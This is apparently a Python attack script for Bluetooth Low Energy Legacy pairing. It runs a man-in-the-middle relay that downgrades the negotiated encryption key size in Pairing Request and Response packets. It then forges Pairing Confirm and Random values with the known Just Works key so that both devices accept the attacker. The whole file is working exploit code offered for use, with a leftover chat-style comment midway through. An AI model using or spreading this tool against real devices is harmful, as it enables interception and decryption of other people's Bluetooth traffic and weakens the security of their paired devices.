# smp_legacy_mitm.py
# MITM for BLE Legacy SMP (Just Works / TK=0): rewrites Pairing Confirm/Random
# to match your downgraded Pairing Req/Rsp (key size 1..16).
#
# Works by:
#  - Recording the downgraded preq/pres each side "saw" (7-byte payloads)
#  - Generating our own nonce r for each side
#  - Replacing outgoing Confirm with c1(TK=0, r, p1, p2)
#  - Replacing outgoing Random with the r we used
#
# Safe no-ops if packet is not SMP or is Secure Connections.
from dataclasses import dataclass, field
import os

# ---- minimal AES-128 ECB (needs pycryptodome) ----
from Crypto.Cipher import AES

def _xor16(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))

def _aes_ecb(k16: bytes, b16: bytes) -> bytes:
    return AES.new(k16, AES.MODE_ECB).encrypt(b16)

def c1_confirm(TK16: bytes, r16: bytes, pres7: bytes, preq7: bytes,
               iat: int, ia6: bytes, rat: int, ra6: bytes) -> bytes:
    p1 = pres7 + preq7 + bytes([rat]) + bytes([iat])      # 16
    p2 = b'\x00\x00\x00\x00' + ia6 + ra6                  # 16
    return _xor16(_aes_ecb(TK16, _xor16(r16, p1)), p2)

def s1_stk(TK16: bytes, r1_16: bytes, r2_16: bytes) -> bytes:
    return _aes_ecb(TK16, r1_16[:8] + r2_16[:8])

def mask_key_to_size(key16: bytes, key_size: int) -> bytes:
    msb = 16 - key_size
    return (b'\x00' * msb) + key16[msb:]

# ---- L2CAP/SMP helpers ----
SMP_CID = 0x0006
SMP_PAIRING_REQ  = 0x01
SMP_PAIRING_RSP  = 0x02
SMP_PAIRING_CFM  = 0x03
SMP_PAIRING_RAND = 0x04
SMP_PUBLIC_KEY   = 0x0C  # Secure Connections indicator

def _is_start_of_l2cap(ll_body: bytes) -> bool:
    return len(ll_body) >= 4 and (ll_body[0] & 0x03) == 0x02 and ll_body[1] >= 4

def _extract_smp(ll_body: bytes):
    """Return (offset, smp_bytes) or (None, None)."""
    if not _is_start_of_l2cap(ll_body):
        return (None, None)
    length = ll_body[1]
    l2cap = ll_body[2:2+length]
    if len(l2cap) < 7:
        return (None, None)
    l2len = l2cap[0] | (l2cap[1] << 8)
    cid   = l2cap[2] | (l2cap[3] << 8)
    if cid != SMP_CID or len(l2cap) < 4 + l2len:
        return (None, None)
    smp = l2cap[4:4+l2len]
    return (2 + 4, smp)  # offset to SMP inside ll_body

def _patch_smp(ll_body: bytes, smp_off: int, new_smp: bytes) -> bytes:
    """Replace SMP payload (keeping L2CAP header + LL framing consistent)."""
    length = ll_body[1]
    l2cap = ll_body[2:2+length]
    l2len_old = l2cap[0] | (l2cap[1] << 8)
    head = ll_body[:2]                  # [LL hdr+len]
    l2hdr = l2cap[:4]                   # [L2LEN,L2CID]
    tail = ll_body[2+4+l2len_old:]      # remainder after old SMP
    new_l2len = len(new_smp)
    new_l2hdr = bytes([new_l2len & 0xFF, (new_l2len >> 8) & 0xFF]) + l2hdr[2:]
    new_l2 = new_l2hdr + new_smp
    new_len = len(new_l2) + 2  # L2 header already counted
    return bytes([head[0]]) + bytes([new_len]) + new_l2 + tail

@dataclass
class SideView:
    """What ONE endpoint 'sees' for p1/p2 and our chosen r."""
    pres7: bytes = None
    preq7: bytes = None
    iat: int = 0
    ia6: bytes = b""
    rat: int = 0
    ra6: bytes = b""
    r16: bytes = None
    confirm_sent: bool = False

@dataclass
class LegacyMitm:
    """
    Tracks both directions of the *same* connection.
    dir names:
      - to_periph: packets going from CENTRAL side -> PERIPHERAL side
      - to_central: packets going from PERIPHERAL side -> CENTRAL side
    """
    key_size: int = 4                         # your downgraded size
    TK: bytes = field(default_factory=lambda: b"\x00"*16)
    to_periph: SideView = field(default_factory=SideView)  # central's view
    to_central: SideView = field(default_factory=SideView) # peripheral's view
    secure_connections_seen: bool = False

    # --- must be called once per link with addresses/types from the initial CONNECT_IND ---
    def set_addresses(self, initA: bytes, initA_is_random: bool, advA: bytes, advA_is_random: bool):
        # For c1, 'ia' is initiator, 'ra' is responder.
        # When we send to PERIPH (central->periph direction), the side verifying is PERIPH:
        self.to_periph.iat = 1 if initA_is_random else 0
        self.to_periph.ia6 = bytes(initA)
        self.to_periph.rat = 1 if advA_is_random else 0
        self.to_periph.ra6 = bytes(advA)
        # When we send to CENTRAL (periph->central), the verifier is CENTRAL (swap roles):
        self.to_central.iat = self.to_periph.iat
        self.to_central.ia6 = self.to_periph.ia6
        self.to_central.rat = self.to_periph.rat
        self.to_central.ra6 = self.to_periph.ra6

    # --- call this on every LL body in each direction ---
    def rewrite_ll_body(self, ll_body: bytes, direction: str):
        """
        direction: "to_periph" (central->periph) or "to_central" (periph->central)
        Returns (possibly_modified_ll_body, changed_bool)
        """
        off, smp = _extract_smp(ll_body)
        if off is None:
            return (ll_body, False)

        code = smp[0]
        # bail out if we see SC
        if code == SMP_PUBLIC_KEY:
            self.secure_connections_seen = True
            return (ll_body, False)

        # capture downgraded preq/pres, assuming caller already patched key-size
        view = self.to_periph if direction == "to_periph" else self.to_central

        if code in (SMP_PAIRING_REQ, SMP_PAIRING_RSP):
            if len(smp) >= 8:
                payload7 = smp[:7]      # io_cap..resp_key_dist (7 bytes)
                if code == SMP_PAIRING_REQ:
                    view.preq7 = payload7
                else:
                    view.pres7 = payload7
            return (ll_body, False)

        # Rewrite Confirm: we generate C' with our own random; remember r for later Random
        if code == SMP_PAIRING_CFM and view.preq7 and view.pres7:
            # generate r for this side only once
            if view.r16 is None:
                view.r16 = os.urandom(16)
            C = c1_confirm(self.TK, view.r16, view.pres7, view.preq7, view.iat, view.ia6, view.rat, view.ra6)
            new_smp = bytes([SMP_PAIRING_CFM]) + C
            new_ll = _patch_smp(ll_body, off, new_smp)
            view.confirm_sent = True
            return (new_ll, True)

        # Rewrite Random: must send the SAME r we used for Confirm to this side
        if code == SMP_PAIRING_RAND and view.confirm_sent and view.r16 is not None:
            new_smp = bytes([SMP_PAIRING_RAND]) + view.r16
            new_ll = _patch_smp(ll_body, off, new_smp)
            return (new_ll, True)

        return (ll_body, False)

# ...paste your code exactly as you posted...

# --- constants we use ---
_SMP_CID = 0x0006
_SMP_PAIRING_REQ = 0x01
_SMP_PAIRING_RSP = 0x02

def _rewrite_ll_l2cap_smp(ll_body: bytes, new_key_size: int = 0x04):
    """
    Input:  full LL 'body' (starts at LL header byte 0x..: LLID|NESN|SN|MD, then length, then payload)
    Output: (modified_ll_body: bytes, changed: bool)

    Rewrites SMP Pairing Req/Resp MaxEncryptionKeySize (1 byte) to new_key_size.
    Only triggers on: LLID=start-of-L2CAP, CID=0x0006, SMP Code in {0x01, 0x02}.
    """
    if len(ll_body) < 4:
        return ll_body, False

    llid = ll_body[0] & 0x03
    length = ll_body[1]
    # must have the whole payload present
    if llid != 0x02 or len(ll_body) < 2 + length or length < 4:
        return ll_body, False

    # L2CAP header starts at offset 2
    l2cap = bytearray(ll_body[2:2+length])
    l2len = l2cap[0] | (l2cap[1] << 8)
    cid   = l2cap[2] | (l2cap[3] << 8)

    # must be SMP CID and enough payload for Pairing Req/Rsp (len >= 7)
    if cid != _SMP_CID or l2len < 7 or len(l2cap) < 4 + l2len:
        return ll_body, False

    smp = bytearray(l2cap[4:4+l2len])
    smp_code = smp[0]
    if smp_code not in (_SMP_PAIRING_REQ, _SMP_PAIRING_RSP):
        return ll_body, False

    # Byte 4 of SMP Pairing Req/Rsp is Max Encryption Key Size
    if smp[4] == new_key_size:
        return ll_body, False  # nothing to change

    smp[4] = new_key_size
    l2cap[4:4+l2len] = smp

    # Reassemble LL body: [hdr,len] + L2CAP(payload)
    new_ll = bytearray(ll_body)
    new_ll[2:2+length] = l2cap  # length unchanged
    return bytes(new_ll), True


def  downgrade_pairing_response(packet_bytes: bytes, new_key_size: int = 0x04):
    """
    Input:  'PACKET' message body from relay_slave -> relay_master:
            [event_le16][LL body ...]
    Output: (modified_packet_bytes, changed: bool)
    """
    if len(packet_bytes) < 4:
        return packet_bytes, False
    event = packet_bytes[:2]
    ll_body = packet_bytes[2:]
    ll_body2, changed = _rewrite_ll_l2cap_smp(ll_body, new_key_size)
    return (event + ll_body2), changed


def downgrade_pairing_request(ll_body: bytes, new_key_size: int = 0x04):
    """
    Input:  msg.body from SniffleHW (full LL body)
    Output: (modified_ll_body, changed: bool)
    """
    return _rewrite_ll_l2cap_smp(ll_body, new_key_size)

